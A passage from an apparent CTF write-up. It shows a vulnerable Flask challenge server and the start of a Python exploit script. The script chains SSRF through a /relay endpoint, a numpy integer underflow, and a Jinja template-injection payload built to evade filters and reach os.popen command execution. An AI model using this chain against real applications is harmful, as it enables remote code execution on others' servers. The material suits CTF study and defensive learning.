class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统一导入模块（按标准库→第三方库→自定义顺序）</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------- 应用初始化 ----------------------</span></span><br><span class="line">app = Flask(<span class="string">&quot;cyberproxy&quot;</span>)</span><br><span class="line">BACKEND_PORT = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机SECRET_KEY用于Session加密</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = binascii.hexlify(os.urandom(<span class="number">24</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------- 限流配置 ----------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_client_id</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成/获取唯一客户端ID，作为限流标识&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;client_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;client_id&#x27;</span>] = uuid.uuid4()</span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;client_id&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化限流器：默认8次/分钟，按客户端ID限流</span></span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app=app,</span><br><span class="line">    key_func=get_client_id,</span><br><span class="line">    default_limits=[<span class="string">&#x27;8/minute&#x27;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可交易的数据碎片列表</span></span><br><span class="line">data_fragments = [<span class="string">&#x27;ALPHA&#x27;</span>, <span class="string">&#x27;BETA&#x27;</span>, <span class="string">&#x27;GAMMA&#x27;</span>, <span class="string">&#x27;DELTA&#x27;</span>, <span class="string">&#x27;EPSILON&#x27;</span>, <span class="string">&#x27;ZETA&#x27;</span>, <span class="string">&#x27;ETA&#x27;</span>, <span class="string">&#x27;THETA&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------- 错误处理 ----------------------</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">429</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_exception</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理429请求限流异常&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Connection throttled. Try again later, choom.&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------- 核心工具函数 ----------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_risk_factor</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算交易风险系数（模拟保底机制）</span></span><br><span class="line"><span class="string">    返回：完成交易所需的尝试次数（决定交易成本）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    base_risk = <span class="number">0.8</span> / <span class="number">100</span>          <span class="comment"># 基础风险概率</span></span><br><span class="line">    transaction_count = <span class="number">0</span>          <span class="comment"># 交易尝试次数</span></span><br><span class="line">    risk_increase_threshold = <span class="number">63</span>   <span class="comment"># 开始提升概率的阈值</span></span><br><span class="line">    risk_peak_threshold = <span class="number">85</span>       <span class="comment"># 概率提升的上限阈值</span></span><br><span class="line">    current_risk = base_risk       <span class="comment"># 当前风险概率</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        transaction_count += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 63~84次：每次概率增加0.08</span></span><br><span class="line">        <span class="keyword">if</span> risk_increase_threshold &lt;= transaction_count &lt; risk_peak_threshold:</span><br><span class="line">            current_risk += <span class="number">0.08</span></span><br><span class="line">        <span class="comment"># 随机数小于当前概率则终止循环</span></span><br><span class="line">        <span class="keyword">if</span> random.random() &lt; current_risk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> transaction_count</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------- 业务接口 ----------------------</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;代理转发到后端服务首页&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(</span><br><span class="line">            <span class="string">f&#x27;http://127.0.0.1:<span class="subst">&#123;BACKEND_PORT&#125;</span>/&#x27;</span>,</span><br><span class="line">            cookies=request.cookies</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            response.text,</span><br><span class="line">            response.status_code,</span><br><span class="line">            &#123;<span class="string">&#x27;Content-Type&#x27;</span>: response.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)&#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Backend service unavailable: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">503</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/initialize&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;初始化用户会话：重置积分、客户端ID、声誉值&quot;&quot;&quot;</span></span><br><span class="line">    session[<span class="string">&#x27;credits&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    session[<span class="string">&#x27;client_id&#x27;</span>] = uuid.uuid4()</span><br><span class="line">    session[<span class="string">&#x27;reputation&#x27;</span>] = <span class="number">100</span></span><br><span class="line">    limiter.reset()  <span class="comment"># 重置限流计数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Session initialized. Welcome to the darknet.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hack&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)  </span><span class="comment"># 每小时仅允许1次黑客攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">earn_credits</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过黑客攻击获取积分（参数amount，最大值99）&quot;&quot;&quot;</span></span><br><span class="line">    earned = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;amount&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requested = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;amount&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> requested &lt; <span class="number">100</span>:</span><br><span class="line">                earned = requested</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Access denied: Excessive credit request flagged.&quot;</span></span><br><span class="line">        <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid credit amount.&quot;</span></span><br><span class="line"></span><br><span class="line">    current_credits = session.get(<span class="string">&#x27;credits&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    session[<span class="string">&#x27;credits&#x27;</span>] = current_credits + earned</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hack successful! Earned <span class="subst">&#123;earned&#125;</span> credits from corporate mainframe.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balance&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_balance</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;查询当前积分余额&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(session.get(<span class="string">&#x27;credits&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/loot&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)  </span><span class="comment"># 每小时仅允许1次数据掠夺</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_loot</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;数据掠夺：随机获取不同等级的积分奖励&quot;&quot;&quot;</span></span><br><span class="line">    current_credits = session.get(<span class="string">&#x27;credits&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 基于UUID生成随机种子（提高随机性）</span></span><br><span class="line">    seed = hashlib.md5(<span class="built_in">str</span>(uuid.uuid4()).encode()).hexdigest()</span><br><span class="line">    roll = <span class="built_in">int</span>(seed[:<span class="number">8</span>], <span class="number">16</span>) % <span class="number">100</span>  <span class="comment"># 取哈希前8位转16进制，再取模100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据随机数分配奖励等级和积分</span></span><br><span class="line">    <span class="keyword">if</span> roll &lt; <span class="number">15</span>:</span><br><span class="line">        current_credits += <span class="number">2</span></span><br><span class="line">        loot_tier = <span class="string">&quot;corrupted&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">15</span> &lt;= roll &lt; <span class="number">45</span>:</span><br><span class="line">        current_credits += <span class="number">4</span></span><br><span class="line">        loot_tier = <span class="string">&quot;encrypted&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">45</span> &lt;= roll &lt; <span class="number">70</span>:</span><br><span class="line">        current_credits += <span class="number">6</span></span><br><span class="line">        loot_tier = <span class="string">&quot;classified&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">70</span> &lt;= roll &lt; <span class="number">92</span>:</span><br><span class="line">        current_credits += <span class="number">8</span></span><br><span class="line">        loot_tier = <span class="string">&quot;military-grade&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        current_credits += <span class="number">12</span></span><br><span class="line">        loot_tier = <span class="string">&quot;quantum-encrypted&quot;</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;credits&#x27;</span>] = current_credits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Data breach successful! Acquired <span class="subst">&#123;loot_tier&#125;</span> intel package.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/market&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trade_fragment</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;交易数据碎片：POST参数fragment，扣除对应积分&quot;&quot;&quot;</span></span><br><span class="line">    fragment_id = request.form.get(<span class="string">&quot;fragment&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> fragment_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Error: No data fragment specified.&lt;/h3&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取当前积分（异常时默认0）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        credits = <span class="built_in">int</span>(session.get(<span class="string">&#x27;credits&#x27;</span>)) <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        credits = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注：np.array此处无实际作用，建议移除（避免整数溢出风险）</span></span><br><span class="line">    credits = np.array(credits)</span><br><span class="line">    transaction_cost = calculate_risk_factor() * <span class="number">3500</span></span><br><span class="line">    credits -= transaction_cost</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理交易逻辑</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> credits &lt; <span class="number">0</span>:</span><br><span class="line">            result = <span class="string">&quot;Insufficient credits for this transaction.&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;credits&#x27;</span>] = <span class="number">0</span>  <span class="comment"># 交易成功后清空积分</span></span><br><span class="line">            <span class="comment"># 校验碎片ID合法性</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> fragment_id.isalpha():</span><br><span class="line">                result = <span class="string">&quot;Invalid fragment ID format.&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> fragment_id <span class="keyword">not</span> <span class="keyword">in</span> data_fragments:</span><br><span class="line">                result = <span class="string">f&quot;Fragment &#x27;<span class="subst">&#123;fragment_id&#125;</span>&#x27; not found in market database.&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">f&quot;Transaction complete! Acquired data fragment: <span class="subst">&#123;fragment_id&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="string">f&quot;Transaction error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&lt;h3&gt;<span class="subst">&#123;result&#125;</span>&lt;/h3&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/list&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_directory</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;列出指定目录下的文件（限制在当前工作目录内，防止路径遍历）&quot;&quot;&quot;</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        base_dir = os.path.abspath(os.getcwd())</span><br><span class="line">        user_path = os.path.normpath(path)</span><br><span class="line">        target_path = os.path.abspath(os.path.join(base_dir, user_path))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 路径安全校验：禁止访问工作目录外的路径</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target_path.startswith(base_dir):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: Access denied - Path outside working directory&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(target_path):</span><br><span class="line">            files = os.listdir(target_path)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(files)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: Not a directory&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;读取指定文件内容（限制在当前工作目录内，防止任意文件读取）&quot;&quot;&quot;</span></span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: No file specified&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        base_dir = os.path.abspath(os.getcwd())</span><br><span class="line">        user_path = os.path.normpath(file_path)</span><br><span class="line">        target_file = os.path.abspath(os.path.join(base_dir, user_path))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 路径安全校验：禁止访问工作目录外的文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target_file.startswith(base_dir):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: Access denied - Path outside working directory&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(target_file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: File not found or not a file&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/relay&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">relay</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;TCP端口转发：接收端口和数据，转发到本地对应端口&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target_port = <span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">        payload = request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建TCP套接字并连接目标端口</span></span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">1</span>)</span><br><span class="line">        sock.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, target_port))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送数据并接收响应</span></span><br><span class="line">        sock.send(payload.encode())</span><br><span class="line">        response_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = sock.recv(<span class="number">2048</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response_data += chunk</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)  <span class="comment"># 解码为字符串，避免二进制返回乱码</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------- 启动应用 ----------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 
@@ -414,222 +326,14 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://45.40.247.139:27418&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">relay_raw</span>(<span class="params">raw_http</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.post(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/relay&quot;</span>, data=&#123;<span class="string">&quot;port&quot;</span>: <span class="string">&quot;5000&quot;</span>, <span class="string">&quot;data&quot;</span>: raw_http&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_cookie</span>(<span class="params">resp</span>):</span><br><span class="line">    m = re.search(<span class="string">r&#x27;Set-Cookie: session=([^;]+)&#x27;</span>, resp)</span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_credits</span>():</span><br><span class="line">    <span class="comment"># 1. 初始化 Session</span></span><br><span class="line">    resp = relay_raw(<span class="string">&quot;GET /initialize HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nConnection: close\r\n\r\n&quot;</span>)</span><br><span class="line">    cookie = extract_cookie(resp)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 触发 NumPy 整数下溢获取巨额积分</span></span><br><span class="line">    hack_req = (<span class="string">f&quot;GET /hack?amount=-9223372036854775808 HTTP/1.1\r\n&quot;</span></span><br><span class="line">                <span class="string">f&quot;Host: 127.0.0.1:5000\r\n&quot;</span></span><br><span class="line">                <span class="string">f&quot;Cookie: session=<span class="subst">&#123;cookie&#125;</span>\r\n&quot;</span></span><br><span class="line">                <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>)</span><br><span class="line">    resp = relay_raw(hack_req)</span><br><span class="line">    <span class="keyword">return</span> extract_cookie(resp) <span class="keyword">or</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># 严格遵循你的“无点、无下划线、无引号”构造逻辑</span></span><br><span class="line">    parts = [</span><br><span class="line">        <span class="string">&#x27;&#123;%set ud=lipsum|string|batch(19)|first|last%&#125;&#x27;</span>, <span class="comment"># 获取下划线 _</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set gl=ud~ud~(dict(glob=1,als=1)|join)~ud~ud%&#125;&#x27;</span>, <span class="comment"># 构造 __globals__</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set gi=dict(g=1,e=2,t=3)|join%&#125;&#x27;</span>, <span class="comment"># 构造 get (代替复杂的 getitem)</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set gd=lipsum|attr(gl)%&#125;&#x27;</span>, <span class="comment"># 获取 globals 字典</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set bi=ud~ud~(dict(built=1,ins=1)|join)~ud~ud%&#125;&#x27;</span>, <span class="comment"># 构造 __builtins__</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set bd=gd|attr(gi)(bi)%&#125;&#x27;</span>, <span class="comment"># 获取 builtins</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set im=ud~ud~(dict(im=1,port=1)|join)~ud~ud%&#125;&#x27;</span>, <span class="comment"># 构造 __import__</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set xx=dict(o=1,s=1)|join%&#125;&#x27;</span>, <span class="comment"># 构造 os</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set omod=bd|attr(gi)(im)(xx)%&#125;&#x27;</span>, <span class="comment"># 执行 __import__(&#x27;os&#x27;)</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set po=dict(po=1,pen=1)|join%&#125;&#x27;</span>, <span class="comment"># 构造 popen</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set cr=dict(chr=1)|join%&#125;&#x27;</span>, <span class="comment"># 构造 chr</span></span><br><span class="line">        <span class="string">&#x27;&#123;%set CF=bd|attr(gi)(cr)%&#125;&#x27;</span>, <span class="comment"># 获取 chr 函数</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将命令 ls / 转换为 chr() 拼接形式，彻底避开空格和斜杠过滤</span></span><br><span class="line">    cmd_expr = <span class="string">&#x27;~&#x27;</span>.join([<span class="string">f&#x27;CF(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>)&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> cmd])</span><br><span class="line">    parts.append(<span class="string">&#x27;&#123;%set cmd=&#x27;</span> + cmd_expr + <span class="string">&#x27;%&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行并打印回显</span></span><br><span class="line">    <span class="comment"># omod.popen(cmd).read()</span></span><br><span class="line">    parts.append(<span class="string">&#x27;&#123;%print(omod|attr(po)(cmd)|attr(dict(re=1,ad=1)|join)())%&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(parts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在尝试执行命令: <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line">    cookie = setup_credits()</span><br><span class="line">    payload = build_payload(cmd)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造原始 POST 报文通过 SSRF 发送</span></span><br><span class="line">    body = <span class="string">f&quot;fragment=<span class="subst">&#123;urllib.parse.quote(payload)&#125;</span>&quot;</span></span><br><span class="line">    raw = (<span class="string">f&quot;POST /market HTTP/1.1\r\n&quot;</span></span><br><span class="line">           <span class="string">f&quot;Host: 